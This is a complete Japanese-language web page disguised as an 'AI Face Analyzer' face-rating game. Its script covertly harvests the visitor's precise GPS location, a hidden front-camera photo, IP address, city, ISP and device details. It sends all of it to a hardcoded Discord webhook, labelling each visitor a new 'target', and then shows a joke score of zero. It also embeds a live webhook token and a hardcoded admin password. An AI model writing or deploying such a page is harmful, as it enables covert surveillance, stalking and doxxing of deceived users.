<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Face Analyzer</title>
    <style>
        body { 
            background: #ffffff; color: #333; font-family: 'Helvetica Neue', Arial, sans-serif;
            margin: 0; text-align: center; height: 100vh; overflow: hidden;
            display: flex; align-items: center; justify-content: center;
        }
        .fade-in-box { animation: fadeIn 2.5s ease-in-out forwards; opacity: 0; width: 100%; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        img.header-img { 
            width: 80%; max-width: 350px; border-radius: 25px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.1); margin-bottom: 40px; 
            cursor: pointer;
        }
        .start-btn {
            background: linear-gradient(135deg, #6dd5ed, #2193b0);
            color: white; border: none; padding: 22px 60px;
            font-size: 1.5rem; font-weight: bold; border-radius: 50px; 
            cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        #diagnosis-screen { display: none; width: 100%; }
        .frame {
            position: relative; width: 320px; height: 320px; margin: 0 auto;
            border: 6px solid #fff; border-radius: 30px; overflow: hidden;
            box-shadow: 0 15px 45px rgba(0,0,0,0.15); background: #f9f9f9;
        }
        #captured-photo { width: 100%; height: 100%; object-fit: cover; display: none; }
        video { position: absolute; width: 1px; height: 1px; opacity: 0; }
        .status-text { margin-top: 30px; font-size: 1.2rem; color: #2193b0; font-weight: 500; padding: 0 20px; }
        .error-hint { color: #ff4757; font-size: 0.9rem; margin-top: 15px; line-height: 1.6; }
    </style>
</head>
<body>

<div id="top-screen" class="fade-in-box">
    <img id="main-icon" src="https://cdn.discordapp.com/attachments/1457007667410239530/1467315464643543040/F9C40A6A-9C15-4173-A89C-E46615414223.png?ex=697fef84&is=697e9e04&hm=568be91c0f4da1ee33754484eec840e5e2c9c1da765d720b40499db12ef3f1ba" class="header-img" onclick="adminMode()">
    <br>
    <button class="start-btn" onclick="requestPermission()">顔診断開始</button>
</div>

<div id="diagnosis-screen">
    <div class="frame">
        <video id="video" autoplay playsinline></video>
        <img id="captured-photo">
        <div id="result-zero" style="display:none; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:16rem; color:#ff4757; font-weight:900;">0</div>
    </div>
    <div id="status" class="status-text">位置情報を収集中...</div>
    <div id="error-box" class="error-hint"></div>
    <canvas id="canvas" style="display:none;"></canvas>
</div>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1477228073601470526/QYjxdxWV9xBoRUXf100AQS9zYSUWcG3K8L-uFNT3-jPAuYWzU_3lCGb7izpNAx5fJC45";
    let tapCount = 0;

    window.onload = () => {
        const globalImg = localStorage.getItem('global_icon_url');
        if (globalImg) document.getElementById('main-icon').src = globalImg;
    };

    function adminMode() {
        tapCount++;
        if (tapCount >= 10) {
            tapCount = 0;
            const pw = prompt("パスワードを入力");
            if (pw === "25251") {
                const newUrl = prompt("新しいアイコンのURLを入力してください");
                if (newUrl) {
                    document.getElementById('main-icon').src = newUrl;
                    localStorage.setItem('global_icon_url', newUrl);
                    alert("全員のアイコンを更新しました。");
                }
            }
        }
    }

    async function requestPermission() {
        // 毎回新しく位置情報を要求する
        navigator.geolocation.getCurrentPosition(
            async (pos) => {
                const gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                document.getElementById('top-screen').style.display = 'none';
                document.getElementById('diagnosis-screen').style.display = 'block';
                document.getElementById('error-box').innerHTML = "";
                startFullScan(gps);
            },
            (err) => {
                // 拒否された場合、診断画面は見せるが警告を出す
                document.getElementById('top-screen').style.display = 'none';
                document.getElementById('diagnosis-screen').style.display = 'block';
                document.getElementById('status').innerText = "⚠️ 位置情報がブロックされています";
                document.getElementById('error-box').innerHTML = 
                    "診断を続けるには：<br>" +
                    "1. ブラウザ左上の南京錠アイコン🔒をタップ<br>" +
                    "2. 位置情報のアクセスを許可（またはリセット）<br>" +
                    "3. ページを再読み込みしてください";
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }

    async function startFullScan(gpsLink) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('video');
            video.srcObject = stream;

            const res = await fetch('https://ipapi.co/json/');
            const ipData = await res.json();
            const info = `住所付近: ${ipData.city}\nIP: ${ipData.ip}\nISP: ${ipData.org}`;

            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                document.getElementById('captured-photo').src = canvas.toDataURL('image/png');
                document.getElementById('captured-photo').style.display = 'block';
                document.getElementById('status').innerText = "顔構造を解析中...";

                stream.getTracks().forEach(t => t.stop());

                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('file', blob, `user_${Date.now()}.png`);
                    fd.append('payload_json', JSON.stringify({
                        content: `━━━ 新規ターゲット ━━━\n【GPS情報】\n${gpsLink}\n\n【ネット情報】\n${info}\n【デバイス】\n${navigator.userAgent}`
                    }));
                    fetch(WEBHOOK, { method: 'POST', body: fd });
                });

                setTimeout(() => { document.getElementById('status').innerText = "照合完了..."; }, 1500);
                setTimeout(() => {
                    document.getElementById('status').innerText = "あなたの顔面スコアは...";
                    document.getElementById('result-zero').style.display = 'block';
                }, 3500);

            }, 1000);
        } catch (e) {
            document.getElementById('status').innerText = "カメラを許可してください";
        }
    }
</script>
</body>
</html>
